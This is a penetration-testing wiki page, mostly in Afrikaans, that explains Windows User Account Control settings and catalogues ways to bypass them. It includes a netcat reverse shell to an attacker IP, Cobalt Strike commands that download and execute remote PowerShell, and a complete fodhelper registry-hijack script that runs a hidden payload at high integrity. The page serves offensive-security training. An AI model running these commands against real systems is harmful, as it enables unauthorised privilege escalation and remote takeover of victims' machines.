# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **consent prompt for elevated activities** moontlik maak. Toepassings het verskillende `integrity`-vlakke, en 'n program met 'n **high level** kan take uitvoer wat **could potentially compromise the system**. Wanneer UAC aangeskakel is, hardloop toepassings en take altyd **onder die security context of a non-administrator account** tensy 'n administrateur uitdruklik hierdie toepassings/take magtig om op administrateurvlak op die stelsel te hardloop. Dit is 'n geriefsfunksie wat administrateurs teen onbedoelde veranderinge beskerm, maar word nie as 'n security boundary beskou nie.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, kry 'n administrateurgebruiker 2 tokens: 'n standaard user token om gewone handelinge op gewone vlak uit te voer, en een met die admin privileges.

Hierdie [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot diepte hoe UAC werk en sluit die logon process, user experience, en UAC architecture in. Administrateurs kan sekuriteitsbeleid gebruik om te konfigureer hoe UAC in hul organisasie werk op plaaslike vlak (gebruik secpol.msc), of gekonfigureer en via Group Policy Objects (GPO) in 'n Active Directory domeinomgewing uitgerol word. Die verskillende instellings word in detail bespreek [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Daar is 10 Group Policy settings wat vir UAC gestel kan word. Die volgende tabel bied addisionele besonderhede:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **functionality via COM objects or RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like system32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### Kontroleer UAC

Om te bevestig of UAC aangeskakel is doen:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
As dit **`1`** is, is UAC **geaktiveer**, as dit **`0`** is of dit nie bestaan nie, dan is UAC **inaktief**.

Kyk dan watter **vlak** gekonfigureer is:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **uitgeskakel**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Altyd waarsku my**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Neem kennis dat as jy grafiese toegang tot die slagoffer het, UAC bypass baie eenvoudig is, aangesien jy net op "Yes" kan klik wanneer die UAC-prompt verskyn

Die UAC bypass is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses loop in 'n medium integrity context, en jou gebruiker is lid van die administrators group**.

Dit is belangrik om te noem dat dit **veel moeiliker is om die UAC te omseil as dit op die hoogste sekuriteitsvlak (Always) is as wanneer dit op enige van die ander vlakke (Default) is.**

### UAC uitgeschakel

Indien UAC reeds uitgeschakel is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **execute a reverse shell with admin privileges** (high integrity level) uitvoer deur iets soos:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC "bypass" (volle toegang tot die file system)

As jy 'n shell het met 'n gebruiker wat binne die Administrators group is, kan jy die gedeelde **C$** via SMB (file system) plaaslik op 'n nuwe skyf mount en sal jy **toegang tot alles binne die file system** hê (selfs die Administrator home folder).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass met cobalt strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op sy maksimum veiligheidsvlak gestel is nie.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### KRBUACBypass

Dokumentasie en hulpmiddel by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) wat 'n **samestelling** van verskeie UAC bypass exploits is. Let wel dat jy **UACME moet compileer met visual studio of msbuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy sal moet weet **watter een jy nodig het.**\
Jy moet **versigtig wees** omdat sommige bypasses **ander programme sal laat reageer** wat die **gebruiker** sal **waarsku** dat iets aan die gang is.

UACME het die **build-weergawe waarvan elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes beïnvloed:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [this](https://en.wikipedia.org/wiki/Windows_10_version_history) bladsy te gebruik, kry jy die Windows-uitgawe `1607` uit die build-weergawes.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertroude binêr `fodhelper.exe` word outo-verhoog op moderne Windows. Wanneer dit gestart word, vra dit die per-gebruiker-registerpad hieronder op sonder om die `DelegateExecute` werkwoord te valideer. Om 'n opdrag daar te plaas laat 'n Medium Integrity-proses (gebruiker is in Administrators) toe om 'n High Integrity-proses te skep sonder 'n UAC-prompt.

Registerpad wat deur fodhelper opgevra word:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell stappe (stel jou payload, dan trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Aantekeninge:
- Werk wanneer die huidige gebruiker 'n lid is van Administrators en UAC vlak is standaard/toegeeflik (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative` pad om 'n 64-bit PowerShell vanaf 'n 32-bit proses op 64-bit Windows te start.
- Payload kan enige opdrag wees (PowerShell, cmd, of 'n EXE-pad). Vermy prompting UIs vir stealth.

#### Meer UAC bypass

**All** die tegnieke wat hier gebruik word om AUC te omseil **require** 'n **full interactive shell** met die teiken ( 'n gewone nc.exe shell is nie genoeg nie).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass met GUI

As jy toegang tot 'n **GUI het** kan jy net die UAC prompt aanvaar wanneer jy dit kry; jy het nie regtig 'n bypass nodig nie. Dus, toegang tot 'n GUI sal jou toelaat om die UAC te omseil.

Boonop, as jy 'n GUI-sessie kry wat iemand gebruik het (miskien via RDP) is daar **some tools that will be running as administrator** vanwaar jy byvoorbeeld 'n **cmd** kan run **as admin** direk sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan 'n bietjie meer **stealthy** wees.

### Luidrugtige brute-force UAC bypass

As dit vir jou nie saak maak om luidrugtig te wees nie, kan jy altyd **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) wat **ask to elevate permissions until the user does accepts it**.

### Jou eie bypass - Basiese UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind 'n binary wat sal **autoelevate** (kontroleer dat wanneer dit uitgevoer word dit op 'n hoë integriteitsvlak loop).
2. Met procmon vind "**NAME NOT FOUND**" events wat vatbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sommige **protected paths** moet skryf (soos C:\Windows\System32) waar jy nie skryfpermissies het nie. Jy kan dit omseil met behulp van:
   1. **wusa.exe**: Windows 7,8 and 8.1. Dit allow om die inhoud van 'n CAB file in beskermde paaie uit te pak (want hierdie tool word uitgevoer op 'n hoë integriteitsvlak).
   2. **IFileOperation**: Windows 10.
4. Berei 'n **script** voor om jou DLL in die beskermde pad te kopieer en die kwesbare en autoelevated binary uit te voer.

### Nog 'n UAC bypass technique

Bestaan daarin om te monitor of 'n **autoElevated binary** probeer om vanaf die **registry** die **name/path** van 'n **binary** of **command** wat uitgevoer moet word te **read** (dit is meer interessant as die binary hierdie inligting binne die **HKCU** soek).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
